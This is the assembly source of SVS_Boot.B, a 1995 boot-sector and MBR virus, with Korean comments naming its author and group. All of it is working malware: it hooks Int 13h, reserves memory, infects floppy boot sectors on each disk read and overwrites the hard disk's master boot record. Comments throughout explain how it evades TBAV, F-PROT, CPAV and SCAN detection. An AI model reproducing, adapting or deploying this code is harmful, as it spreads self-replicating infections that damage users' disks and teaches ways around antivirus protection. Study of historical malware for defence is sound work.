;
;                            SVS_Boot (Type B)
;                            *****************
;
; 이름 : SVS_Boot.B
; 다른 이름 : Assassin_Boot.B
; 제작자 : 바이러스의 기사 (KOV : Knight Of Virus)
; 그룹 : 서울 바이러스 연합 (SVS : Seoul Virus Society)
; 제작지 : 한국 (95.8.11)
;
; 언어 : MASM / TASM
; 종류 : 부트 / MBR
;
; 설명 : KOV 가 제작한 부트 바이러스로 MBR 에 직접 겹쳐써 버린다.
;        자체 부팅 기능을 가지고 있다.
;
;        일반 기억 장소 영역을 1 KB 줄인다.
;
; * SVS_Boot.A  : 최초 버전이다. 94년에 제작되었다고 한다.
;                 360 KB 용으로 제작되었다.
; ! SVS_Boot.B  : 1.2MB 디스크도 감염 시킨다.
;
;
;
;
;
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

 BOOT          SEGMENT PARA 'BOOT'
               ASSUME  CS:Boot, DS:Boot

 Start:        Jmp     Virus_Start           ; 점프
               DB      59 dup (?)            ; BPB 영역

;      TASM 으로 컴파일 할때 BPB 영역을 좀 바꾸어 할것이다.
;    MS-DOS 5.0 에 맞게 제작되었다. /C 옵션을 주면 60 으로
;    길게 해야한다.
 Virus_Start:
               cli                           ; 스택 조절
               xor     ax,ax                 ; AX=0000
               mov     ds,ax                 ; DS=0000
               mov     ss,ax                 ; SS=0000
               mov     sp,07c00h             ; SP=7C00h
               sti

; SCAN 은 413h가 검출되면 부트 바이러스라고 진단한다.
; 참고로 이 바이러스는 TBAV,F-PROT 에서 진단안된다.

               CLD
               mov     bx,1304h              ; Unknown 에 검출되지 않기위함
               xchg    bh,bl                 ; BX =  0413h
               dec     word ptr ds:[bx]      ; 1KB 감소(바이러스가 사용)
               mov     ax,ds:[bx]            ; AX에 줄어든 값
               mov     cl,06                 ; 세그먼트 계산
               shl     ax,cl
               mov     es,ax                 ; ES=DOS 에서 사용안하는 세그먼트

               mov     si,07c00h             ; 바이러스는 0000:7C00h 에 위치한다.
               xor     di,di                 ; DI=0000
               mov     cx, offset Endvirus   ; 길이
               repz    movsb                 ; 복사
               nop                           ; NOP을 안해주면 역시 검색된다.
               push    es                    ; 바이러스가 있는 곳으로 점프
               mov     ax, offset Get_Int13
               push    ax
               retf

 Get_Int13:
               mov     si,004bh              ; Int 13h의 값 얻기
               inc     si                    ; CPAV 의 Viral Code B X
               mov     di,offset OldInt13    ; TBAV 의 Unkown 을 방지하려고
               movsw                         ; 값을 저장한다.
               movsw

               Push    cs                    ; DS는 CS값
               Pop     ds                    ;
               xor     ax,ax                 ; ES=0000 즉, 재 부팅할곳
               mov     es,ax

               cmp     byte ptr ds:[Sector],00 ; 부팅 중인 디스크 검사
               jnz     FloppyBooting         ; 플로피일 경우 하드 감염

               MOV     BX,01AEh              ; 하드의 경우 바이러스 내부 값으로 부팅
 Next_PAT:     add     BX,+10h
               cmp     byte ptr [BX],80h     ; DOS 용 부트 값인가?
               jnz     Next_PAT
               MOV     DX,[BX]               ; SI로 하면 CPAV 에서 진단된다.
               MOV     CX,[BX+02]
               JMP     Read_OrgBoot          ; 재부팅함

 FloppyBooting:
               mov     dl,80h                ; 플로피 경우 하드 감염 시킴
               call    Infect_BOOT           ;

               mov     cl,byte ptr ds:[Sector]
               mov     dx,0100h
 Read_OrgBoot:
               mov     bx,07c00h
               mov     ah,02                 ; 원래 부트 읽어들이기
               call    F_RWBoot2

 ReBoot:       xor     ax,ax                 ; Int 13h를 바이러스가 차지하고 다시 부팅
               mov     ds,ax
               mov     si,0040h              ; 0:4Ch = Int 13h
               mov     word ptr ds:[SI+0Ch],offset VirInt13
               mov     ds:[SI+0Eh],cs
               DB      0eah,00,7ch,00,00h    ; JMP 0000:7c00h
 Sector        DB      03h                   ; 03=360KB
;     1.2MB 이면       0Eh                   ; 0E=1.2MB

;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;    바이러스가 가로채서 사용하는 Int 13h
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

 VirInt13:
               cmp     dl,01                 ; C 드라이브 이면 감염제외
               ja      Jump_Int13
               cmp     ah,02                 ; 디스크 읽기 인가?
               jnz     Jump_Int13
               call    Infect_BOOT           ; 감염 호출

 Jump_Int13:   DB      0Eah                  ; 점프
 OldInt13:     DD ?


 Infect_BOOT:
               Push    ax                    ; 저장
               Push    bx
               Push    cx
               Push    dx
               Push    si
               Push    di
               Push    ds
               Push    es

               Push    cs                    ; CS=DS=ES
               pop     ds
               Push    cs
               pop     es

               mov     ah,02h                ; 부트 섹터 읽기
               call    F_RWBoot              ; 길이를 줄이려고 평션화
               jc      Exit

               mov     ax,DS:[0123h]         ; 바이러스 감염 여부 검사
               cmp     ax,DS:[0323h]
               jz      Exit                  ; 감염되었으면 끝내기


 GetBPB_ErrMsg:
               cld
               mov     si,0203h              ; 원래 BPB의 내용을 복사한다.
               mov     di,0003h
               mov     cl,59
               repz    movsb

               mov     si,offset Endvirus+200h ; 에러메시지를 복사한다. 단, 이값은 바이러스
               mov     di,offset Endvirus      ; 길이가 길어지면 그에 맞추어 바꾸어 주어야
               mov     cx,512
               sub     cx, offset  Endvirus  ; 한다.
               repz    movsb

               mov     byte ptr ds:[Sector],00 ; 00이면 하드 디스크임
               cmp     dl,80h                ; 하드 디스크인가?
               jz      Write_BV

               mov     ah,03
               Mov     bx,0200h              ; 원래 부트 쓰기
               mov     cl,03
               mov     dh,01
               cmp     byte ptr ds:[215h],0FDh ; 360KB 용인가?
               jz      Write_OrgBoot
               mov     cl,0Eh                ; 1.2 MB 디스크의 루트 끝
 Write_OrgBoot:
               call    F_RWBoot2
               mov     byte ptr Sector,cl

 Write_BV:
               mov     ah,03                 ; 부트 섹터에 바이러스 쓰기
               xor     bx,bx
               call    F_RWBoot1
 Exit:
               pop     es
               pop     ds
               pop     di
               pop     si
               pop     dx
               pop     cx
               pop     bx
               pop     ax
 R_InfectDsk:  RET

;<><><><><><><><><><><><><><><><><><><><><><>
; 디스크의 읽기/쓰기 호출 평션
;<><><><><><><><><><><><><><><><><><><><><><>
 F_RWBoot:     mov     bx,0200h              ; 버퍼 주소
 F_RWBoot1:    mov     cx,0001h              ; 기본값은 부트 섹터
               mov     dh,00                 ;
 F_RWBoot2:    mov     al,01                 ;
               mov     di,0003
 callInt13:    pushf
               call    dword ptr cs:OldInt13
               jnc     Return
               dec     di
               jnz     callInt13
               stc
 Return:       ret
 Virus_name    DB      'SVS.B'               ; 바이러스 이름
 Endvirus:

 Boot          ENDS
               END     START
